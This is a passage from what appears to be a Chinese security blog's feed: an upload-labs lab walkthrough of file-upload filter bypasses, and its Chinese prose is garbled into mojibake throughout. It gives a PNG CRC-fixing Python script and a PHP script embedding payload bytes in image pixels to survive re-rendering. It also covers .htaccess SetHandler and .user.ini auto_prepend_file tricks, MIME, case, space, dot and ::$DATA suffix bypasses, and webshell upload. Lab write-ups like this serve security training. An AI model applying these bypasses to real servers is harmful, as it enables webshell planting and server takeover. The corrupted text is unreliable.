3E</code>æ‰¾åˆ°PLTEæ ‡è¯†åå°†å…¶å18ä¸ªæ•°æ®æ”¹ä¸ºä»£ç çš„ç¼–ç ï¼Œç„¶åå†è®¡ç®—PLTEæ•°æ®å—çš„CRCï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> repng = open(<span class="hljs-string">r&#x27;2.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)a = png.read()png.close()hexstr = binascii.b2a_hex(a)<span class="hljs-string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span>data =  <span class="hljs-string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="hljs-string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="hljs-number">0</span>]crc = binascii.crc32(data[:<span class="hljs-number">-16</span>].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-keyword">print</span> hex(crc)</code></pre><p>æ‘˜è‡ª<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>åå°†CRCå€¼æ”¹ä¸ºè¿è¡Œåçš„ï¼Œå°†æ­¤å›¾ç‰‡ä¸Šä¼ ï¼Œå³å¯ã€‚</p><p>è¿˜æœ‰ä¸€ç§æ€è·¯ï¼šå†™å…¥IDATæ•°æ®å—</p><p>ç›´æ¥è¿è¡Œè„šæœ¬</p><pre><code class="hljs angelscript">&lt;?php$p = <span class="hljs-built_in">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) &#123;   $r = $p[$y];   $g = $p[$y+<span class="hljs-number">1</span>];   $b = $p[$y+<span class="hljs-number">2</span>];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);&#125;imagepng($img,<span class="hljs-string">&#x27;./00.png&#x27;</span>);?&gt;</code></pre><p>æ‘˜è‡ª<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>jpgä¹Ÿæ˜¯è¿ç”¨è„šæœ¬ï¼Œå…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡åœ¨å°†å›¾ç‰‡ä¸‹è½½è‡³æœ¬åœ°ç”¨è„šæœ¬è¿è¡Œå†é‡æ–°ä¸Šä¼ å³å¯ï¼Œè„šæœ¬ä¾æ—§å†ä¸Šé¢çš„é“¾æ¥é‡Œã€‚äºŒæ¬¡æ¸²æŸ“å°±ç»“æŸå•¦~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2021/01/24/upload/"/>
    <url>/2021/01/24/upload/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#pass-01%E5%89%8D%E7%AB%AFjs%E7%BB%95%E8%BF%87">Pass-01(å‰ç«¯jsç»•è¿‡)</a><ul><li><a href="#%E5%88%A0%E9%99%A4js%E6%A0%A1%E9%AA%8C%E4%BB%A3%E7%A0%81">åˆ é™¤jsæ ¡éªŒä»£ç </a></li><li><a href="#%E6%9B%B4%E6%94%B9js%E6%A0%A1%E9%AA%8C%E4%B8%AD%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95">æ›´æ”¹jsæ ¡éªŒä¸­çš„ç™½åå•</a></li><li><a href="#%E5%85%88%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E9%80%9A%E8%BF%87js%E6%A0%A1%E9%AA%8C%E5%86%8D%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80%E4%B8%8A%E4%BC%A0%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8">å…ˆæ”¹æ–‡ä»¶åç¼€åé€šè¿‡jsæ ¡éªŒå†æŠ“åŒ…æ›´æ”¹åç¼€ä¸Šä¼ è‡³æœåŠ¡å™¨</a></li></ul></li><li><a href="#pass-02mime%E9%AA%8C%E8%AF%81">Pass-02(MIMEéªŒè¯)</a></li><li><a href="#pass-03%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">Pass-03(é»‘åå•ç»•è¿‡)</a></li><li><a href="#pass-04%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-htaccess">Pass-04(é»‘åå•ç»•è¿‡-.htaccess)</a></li><li><a href="#pass-05%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81userini">Pass-05ï¼ˆé»‘åå•éªŒè¯ï¼Œ.user.ini.ï¼‰</a></li><li><a href="#pass-06%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-06(é»‘åå•éªŒè¯-å¤§å°å†™ç»•è¿‡)</a></li><li><a href="#pass-07%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-07(é»‘åå•éªŒè¯â€“ç©ºæ ¼ç»•è¿‡)</a></li><li><a href="#pass-08%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-08ï¼ˆé»‘åå•éªŒè¯â€“ç‚¹å·ç»•è¿‡ï¼‰</a></li><li><a href="#pass-09%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6data%E7%BB%95%E8%BF%87">Pass-09(é»‘åå•éªŒè¯â€“ç‰¹æ®Šå­—ç¬¦::$DATAç»•è¿‡)</a></li><li><a href="#pass-10%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8D%95%E6%AC%A1%E5%A4%84%E7%90%86">Pass-10ï¼ˆé»‘åå•-å•æ¬¡å¤„ç†ï¼‰</a></li><li><a href="#pass-11%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">Pass-11ï¼ˆé»‘åå•-åŒå†™ç»•è¿‡)</a></li><li><a href="#pass-12%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-get%E5%9E%8B">Pass-12ï¼ˆç™½åå•-0x00æˆªæ–­-GETå‹)</a></li><li><a href="#pass-13%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-post%E5%9E%8B">Pass-13ï¼ˆç™½åå•-0x00æˆªæ–­-POSTå‹)</a></li><li><a href="#pass-14%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-14ï¼ˆç™½åå•-å›¾ç‰‡é©¬)</a></li><li><a href="#pass-15%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-getimagesize">Pass-15(ç™½åå•-å›¾ç‰‡é©¬-getimagesize())</a></li><li><a href="#pass-16%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-exif_imagetype">Pass-16(ç™½åå•-å›¾ç‰‡é©¬-exif_imagetype())</a></li><li><a href="#pass-17%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">Pass-17(ç™½åå•-å›¾ç‰‡é©¬-äºŒæ¬¡æ¸²æŸ“)</a></li><li><a href="#pass-18%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E6%97%B6%E9%97%B4">Pass-18ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-æ—¶é—´)</a></li><li><a href="#pass-19%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-19ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-å›¾ç‰‡é©¬)</a></li><li><a href="#pass-20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-20ï¼ˆé»‘åå•éªŒè¯-ç‚¹å·ç»•è¿‡â€¦â€¦)</a></li><li><a href="#pass-21%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87">Pass-21ï¼ˆç™½åå•éªŒè¯-æ•°ç»„ç»•è¿‡)</a></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul><h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ä»‹ç»"><a class="header-anchor" href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´ä»‹ç»">ğŸ­</a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ä»‹ç»</h2><p>webåº”ç”¨ç¨‹åºé€šå¸¸å¸¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨åšå®¢å‘è¡¨æ–‡ç« éœ€è¦ä¸Šä¼ å›¾ç‰‡ç­‰è¡Œä¸ºå°±å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æ–‡ä»¶ä¸Šä¼ æ¼æ´å°±æ˜¯åˆ©ç”¨ç½‘é¡µä»£ç ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„å˜é‡è¿‡æ»¤ä¸ä¸¥å°†å¯æ‰§è¡Œçš„æ–‡ä»¶ä¸Šä¼ åˆ°ä¸€ä¸ªåˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡URLå»è®¿é—®ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥ç›´æ¥ä¸Šä¼ WebShellï¼ˆä»¥aspã€phpæˆ–è€…jspç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼‰åˆ°æœåŠ¡å™¨ä¸Šã€‚è¯¦æƒ…ï¼š<a href="https://segmentfault.com/a/1190000016012608">æ–‡ä»¶ä¸Šä¼ æ¼æ´</a></p><p>å…±æœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><p><img src="/2021/01/24/upload/2.jpg" alt="2"></p><p>ï¼ˆåšäº†mä¹…çš„æ€ç»´å¯¼å›¾â€¦)</p><h1>Pass-01(å‰ç«¯jsç»•è¿‡)</h1><p>é¡µé¢è¦æ±‚ä¸Šä¼ webshellï¼Œéšæ„å†™ä¸€ä¸ªphpä¸Šä¼ (ä¸€å¥è¯æœ¨é©¬åœ¨æœ¬åœ°ç«¯ä¸ç›´è§‚)åï¼š</p><img src="/2021/01/24/upload/1.jpg" alt="1" style="zoom:67%;"><p>æŸ¥çœ‹æºç å‘ç°ä¸ºjså‰ç«¯éªŒè¯ï¼Œä¸”å®šä¹‰äº†ä¸€ä¸ªç™½åå•ï¼Œåªè®©å›¾ç¤ºå‡ ç§æ ¼å¼é€šè¿‡ã€‚jså‰ç«¯éªŒè¯æœ‰ä»¥ä¸‹å‡ ç§æ€è·¯ï¼š</p><p>1ã€åˆ é™¤jsæ ¡éªŒä»£ç </p><p>2ã€æ›´æ”¹jsæ ¡éªŒä¸­çš„ç™½åå•</p><p>3ã€å…ˆæ”¹æ–‡ä»¶åç¼€åé€šè¿‡jsæ ¡éªŒå†æŠ“åŒ…æ›´æ”¹åç¼€ä¸Šä¼ è‡³æœåŠ¡å™¨</p><h3 id="åˆ é™¤jsæ ¡éªŒä»£ç "><a class="header-anchor" href="#åˆ é™¤jsæ ¡éªŒä»£ç ">ğŸ­</a>åˆ é™¤jsæ ¡éªŒä»£ç </h3><p>æœ¬æ¥å¯ä»¥åœ¨firebugè¿›è¡Œåˆ æ”¹ï¼Œæ–°ç‰ˆç«ç‹æ²¡æœ‰è¿™ä¸ªæ’ä»¶äº†ï¼Œåªèƒ½é€šè¿‡æºä»£ç æˆ–è€…æŠ“åŒ…è¿›è¡Œåˆ æ”¹äº†ã€‚å°†éªŒè¯å‡½æ•°åˆ é™¤å³å¯ï¼š</p><p><img src="/2021/01/24/upload/4.jpg" alt="4"></p><h3 id="æ›´æ”¹jsæ ¡éªŒä¸­çš„ç™½åå•"><a class="header-anchor" href="#æ›´æ”¹jsæ ¡éªŒä¸­çš„ç™½åå•">ğŸ­</a>æ›´æ”¹jsæ ¡éªŒä¸­çš„ç™½åå•</h3><p>å°†PHPæ ¼å¼åŠ ä¸Šï¼š</p><p><img src="/2021/01/24/upload/3.jpg" alt="3"></p><h3 id="å…ˆæ”¹æ–‡ä»¶åç¼€åé€šè¿‡jsæ ¡éªŒå†æŠ“åŒ…æ›´æ”¹åç¼€ä¸Šä¼ è‡³æœåŠ¡å™¨"><a class="header-anchor" href="#å…ˆæ”¹æ–‡ä»¶åç¼€åé€šè¿‡jsæ ¡éªŒå†æŠ“åŒ…æ›´æ”¹åç¼€ä¸Šä¼ è‡³æœåŠ¡å™¨">ğŸ­</a>å…ˆæ”¹æ–‡ä»¶åç¼€åé€šè¿‡jsæ ¡éªŒå†æŠ“åŒ…æ›´æ”¹åç¼€ä¸Šä¼ è‡³æœåŠ¡å™¨</h3><p>å…ˆå°†PHPåç¼€æ”¹ä¸ºjpgæ ¼å¼çš„å›¾ç‰‡ï¼Œä¸Šä¼ æ—¶è¿›è¡ŒæŠ“åŒ…æ‹¦æˆªï¼Œå†ä¿®æ”¹åç¼€:</p><p><img src="/2021/01/24/upload/6.jpg" alt="6"></p><p>ä¸Šä¼ æˆåŠŸ~~</p><p><img src="/2021/01/24/upload/5.jpg" alt="5"></p><h1>Pass-02(MIMEéªŒè¯)</h1><p>æç¤ºæ˜¾ç¤ºè¿›è¡ŒMIMEæ ¡éªŒï¼š</p><p>MIME(Multipurpose Internet Mail  Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚åœ¨HTTPä¸­ï¼ŒMIMEç±»å‹è¢«å®šä¹‰åœ¨Content-Type headerä¸­ã€‚</p><p>å¸¸è§ç±»å‹ï¼š</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">audio</span>/mpeg -&gt;</span> .mp3<span class="hljs-function"><span class="hljs-title">application</span>/msword -&gt;</span> .doc<span class="hljs-function"><span class="hljs-title">application</span>/octet-stream -&gt;</span> .exe<span class="hljs-function"><span class="hljs-title">application</span>/pdf -&gt;</span> .pdf<span class="hljs-function"><span class="hljs-title">application</span>/x-javascript -&gt;</span> .js<span class="hljs-function"><span class="hljs-title">application</span>/x-rar -&gt;</span> .rar<span class="hljs-function"><span class="hljs-title">application</span>/zip -&gt;</span> .zip<span class="hljs-function"><span class="hljs-title">image</span>/gif -&gt;</span> .gif<span class="hljs-function"><span class="hljs-title">image</span>/jpeg -&gt;</span> .jpg / .jpeg<span class="hljs-function"><span class="hljs-title">image</span>/png -&gt;</span> .png<span class="hljs-function"><span class="hljs-title">text</span>/plain -&gt;</span> .txt<span class="hljs-function"><span class="hljs-title">text</span>/html -&gt;</span> .html<span class="hljs-function"><span class="hljs-title">video</span>/mp4 -&gt;</span> .mp4</code></pre><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2021/01/24/upload/7.jpg" alt="7"></p><p>æœ¬å…³ç±»å‹æ˜¯image/jpegã€image/pngã€image/gifä¸­çš„ä»»ä½•ä¸€ç§å°±å…è®¸ä¸Šä¼ ï¼Œå¦åˆ™å°±æç¤ºæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ã€‚å½“ä¸Šä¼ ä¸€ä¸ªPHPæ—¶ï¼ŒMIMEç±»å‹ä¸ç¬¦åˆæœåŠ¡å™¨ç«¯çš„è¦æ±‚ï¼Œä¸Šä¼ å°±ä¼šå¤±è´¥ã€‚pass-01ä¸­å…ˆæ”¹æ–‡ä»¶åç¼€åé€šè¿‡jsæ ¡éªŒå†æŠ“åŒ…æ›´æ”¹åç¼€ä¸Šä¼ è‡³æœåŠ¡å™¨çš„æ–¹æ³•ä¸€æ ·å¯è¡Œã€‚</p><p>å¦ä¸€ç§æ–¹æ³•æ˜¯æ”¹MIMEç±»å‹ï¼š</p><p>ä¸Šä¼ PHPï¼ŒæŠ“åŒ…å°†MIMEç±»å‹æ”¹ä¸ºæœåŠ¡å™¨å…è®¸çš„ï¼ŒåŸç†æ˜¯ç»•è¿‡äº†æœåŠ¡å™¨ç«¯å¯¹MIMEçš„æ£€æµ‹å¹¶æˆåŠŸå°†shellä¸Šä¼ ã€‚</p><p><img src="/2021/01/24/upload/8.jpg" alt="8"></p><h1>Pass-03(é»‘åå•ç»•è¿‡)</h1><p>æŸ¥çœ‹æç¤ºï¼š</p><img src="/2021/01/24/upload/9.jpg" alt="9" style="zoom:50%;"><p>æœ¬å…³å±äºé»‘åå•éªŒè¯</p><pre><code class="hljs jboss-cli">é»‘åå•è¿‡æ»¤çš„ç¼ºç‚¹ï¼š    æ”»å‡»è€…å¯ä»¥ä»é»‘åå•ä¸­æ‰¾åˆ°Webå¼€å‘è€…å¿½ç•¥çš„æ‰©å±•å    æ²¡æœ‰è¿›è¡Œå¤§å°å†™è½¬æ¢ï¼Œè¯¸å¦‚<span class="hljs-string">.PHP</span>æ‰©å±•åä¸åœ¨é»‘åå•é‡Œï¼Œä¾æ—§ä¼šè¢«æœåŠ¡å™¨æ¥æ”¶    windowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœæ–‡ä»¶åä»¥<span class="hljs-string">&quot;.&quot;</span>æˆ–ç©ºæ ¼ç»“å°¾ä¼šè‡ªåŠ¨å–å‡ºã€‚asp.è½¬åŒ–ä¸ºasp</code></pre><p>æœ¬å…³å°†å¸¸ç”¨è„šæœ¬è¯­è¨€çš„shellæ–‡ä»¶åç¼€å…¨éƒ¨ç¦æ­¢ï¼ŒApacheè§£æé¡ºåºæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€ï¼Œå¦‚æœæœ€å³ä¾§æ‰©å±•åä¸èƒ½è¯†åˆ«çš„è¯ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚è€Œä¸”Apacheçš„httpd.confä¸­å¯ä»¥è¿›è¡Œé…ç½®ï¼Œè§„å®šå“ªäº›æ–‡ä»¶åç¼€æ˜¯ä»¥phpæ ¼å¼æ¥è§£æçš„ã€‚æœ¬å…³çš„è§£æ³•å°±ä»è¿™å¾—æ¥ï¼Œå°è¯•ç”¨php3,phtmlç»•è¿‡ï¼š</p><p>ä¸€æ ·å…ˆæŠ“åŒ…ï¼Œæ”¹åç¼€åï¼Œæœ¬å…³ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå› ä¸ºé€šè¿‡è¿™ç§æ–¹å¼ä¸Šä¼ çš„æ–‡ä»¶æœåŠ¡å™¨ä¼šä¿®æ”¹æ–‡ä»¶åï¼Œæ•…èšå‰‘è¿æ¥æ—¶æ–‡ä»¶åè®°å¾—æ¢ã€‚</p><h1>Pass-04(é»‘åå•ç»•è¿‡-.htaccess)</h1><p>æŸ¥çœ‹æç¤ºé»‘åå•æœ‰ç‚¹å¤šï¼Œä½†æ˜¯æ¼æ‰äº†ApacheæœåŠ¡å™¨çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶.htaccessã€‚æ‰€ä»¥è¿™å…³çš„æ€è·¯å°±æ˜¯<strong>å…ˆä¸Šä¼ ä¸€ä¸ªhtaccessæ–‡ä»¶ï¼Œå†™å…¥è§„åˆ™è®©æœåŠ¡å™¨æŠŠæŒ‡å®šçš„æ–‡ä»¶æ ¼å¼æŒ‰ç…§phpçš„æ ¼å¼è§£æã€‚ç„¶åå°±ä¸Šä¼ æŒ‡å®šæ–‡ä»¶æ ¼å¼çš„æ–‡ä»¶ï¼ˆä¸åœ¨é»‘åå•ä¸­çš„ï¼‰è¿›è¡Œæµ‹è¯•ã€‚</strong></p><p>æ–‡ä»¶è¦å†™å…¥ï¼šSetHandler application/x-httpd-php(è®©Apacheå¯¹å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä»¥phpçš„æ ¼å¼è¿›è¡Œè§£æ).ä¸Šä¼ ï¼ŒæŠ“åŒ…:</p><p><img src="/2021/01/24/upload/10.jpg" alt="10"></p><p>å†å°†shellæ”¹ä¸€ä¸‹æ‹“å±•åï¼Œä¸Šä¼ å³å¯ã€‚</p><h1>Pass-05ï¼ˆé»‘åå•éªŒè¯ï¼Œ.user.ini.ï¼‰</h1><p><img src="/2021/01/24/upload/11.jpg" alt="11"></p><p>æœ¬å…³å¯ä»¥åˆ©ç”¨inié…ç½®æ–‡ä»¶è¿›è¡Œä¸Šä¼ ï¼Œå…ˆä¸Šä¼ ä»¥<code>auto_prepend_file=1.jpg</code>ä¸ºå†…å®¹çš„<code>.user.ini</code>æ–‡ä»¶ï¼ˆ<strong>æ‰€æœ‰çš„phpæ–‡ä»¶éƒ½è‡ªåŠ¨åŒ…å«1.jpgæ–‡ä»¶ã€‚.user.iniç›¸å½“äºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„php.ini</strong>ï¼‰ç„¶åå†ä¸Šä¼ ä¸€å¥è¯çš„è„šæœ¬ï¼Œå‘½åä¸º<code>1.jpg</code>ã€‚è®¿é—®å³å¯ã€‚</p><h1>Pass-06(é»‘åå•éªŒè¯-å¤§å°å†™ç»•è¿‡)</h1><p>æŸ¥çœ‹æºä»£ç å¯çŸ¥æ— å¤§å°å†™è½¬æ¢ï¼Œå°†æ–‡ä»¶ååç¼€ç›´æ¥æ”¹æˆPhp,å¤§å°å†™æ··åˆçš„æ ¼å¼å³å¯ã€‚</p><h1>Pass-07(<strong>é»‘åå•éªŒè¯â€“ç©ºæ ¼ç»•è¿‡</strong>)</h1><p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç«¯å¯¹æ–‡ä»¶åç¼€åä»…ä»…æ˜¯è¿›è¡Œäº†å»é™¤æœ«å°¾çš„â€.â€ä»¥åŠå°å†™è½¬æ¢æ“ä½œã€‚ä½†æ˜¯å¹¶æ²¡æœ‰è¿›è¡Œå»é™¤ç©ºæ ¼çš„æ“ä½œ,(<strong>windowsç³»ç»Ÿä¸­ä¼šå°†æ–‡ä»¶æ‰©å±•ååçš„ç©ºæ ¼åšç©ºå¤„ç†ï¼Œé˜²æ­¢æ–‡ä»¶è¢«å½“æˆå¦ä¸€ç§ä¸å¯è¯†åˆ«çš„æ–‡ä»¶ç±»å‹ã€‚æ•…å¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥ç»•è¿‡è¿™ä¸€å…³çš„é»‘åå•</strong>)ç›´æ¥ä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼ŒåŠ ç©ºæ ¼ï¼Œè®¿é—®ã€‚</p><h1>Pass-08ï¼ˆé»‘åå•éªŒè¯â€“ç‚¹å·ç»•è¿‡ï¼‰</h1><p>è§‚å¯Ÿä»£ç ï¼Œæ²¡æœ‰è¿›è¡Œç‚¹å·å»é™¤(<strong>windowsç³»ç»Ÿå¯¹äºæ–‡ä»¶åç¼€ååé¢è·Ÿçš„â€.â€ä¼šè‡ªåŠ¨å»é™¤ï¼Œä¸ç®¡æ˜¯æ·»åŠ ä¸€ä¸ªè¿˜æ˜¯å¤šä¸ªæ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„</strong>)ï¼Œåˆ©ç”¨æ­¤ç‚¹ï¼ŒæŠ“åŒ…ï¼ŒåŠ ç‚¹ã€‚</p><h1>Pass-09(é»‘åå•éªŒè¯â€“ç‰¹æ®Šå­—ç¬¦::$DATAç»•è¿‡)</h1><p>ä»£ç å°‘äº†å¯¹<code>::$DATA</code>çš„å¤„ç†</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">DATA</span><span class="hljs-params">(NTFSæ–‡ä»¶ç³»ç»Ÿçš„å­˜å‚¨æ•°æ®æµçš„ä¸€ä¸ªå±æ€§)</span><span class="hljs-title">NTFS</span></span>æ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒ,å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµï¼Œæ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œè¿™ä¸ªé»˜è®¤æ•°æ®æµç§°ä¸ºï¼š<span class="hljs-variable">$DATA</span>,å½“æˆ‘ä»¬è®¿é—®<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span> æ—¶ï¼Œå°±æ˜¯è¯·æ±‚ <span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> æœ¬èº«çš„æ•°æ®ï¼Œå¦‚æœ<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span> è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span>:lake2.phpï¼Œè¯·æ±‚<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>:lake2<span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span>ï¼Œåˆ™æ˜¯è¯·æ±‚<span class="hljs-number">1</span>.phpä¸­çš„æµæ•°æ®lake2.phpçš„æµæ•°æ®å†…å®¹ã€‚</code></pre><p>æ•…æœ¬å…³å¯è§£ï¼šæŠ“åŒ…ï¼Œæ”¹åç¼€(åŠ ä¸Š::$DATA)ï¼Œè®¿é—®(<strong>æœåŠ¡å™¨ç«¯ä¼šå¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½å,ä¸”æ–‡ä»¶ä¸ºæ­£å¸¸çš„phpæ–‡ä»¶ï¼Œæ•…ä¸€æ ·å¯ç”¨èšå‰‘è¿æ¥</strong>)</p><h1>Pass-10ï¼ˆé»‘åå•-å•æ¬¡å¤„ç†ï¼‰</h1><p>ä»æºä»£ç 